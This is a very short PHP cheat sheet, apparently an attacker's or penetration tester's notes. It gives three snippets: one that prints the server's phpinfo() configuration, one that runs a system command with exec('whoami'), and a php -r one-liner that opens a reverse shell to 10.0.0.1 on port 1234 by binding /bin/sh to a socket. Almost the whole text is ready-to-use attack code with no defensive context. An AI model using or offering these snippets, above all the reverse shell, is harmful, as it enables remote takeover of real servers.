show php info page

```php
<?php

phpinfo();

?>
```

run commands via php

```php
<?php
    
echo exec('whoami');

?>
```

reverse shell

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```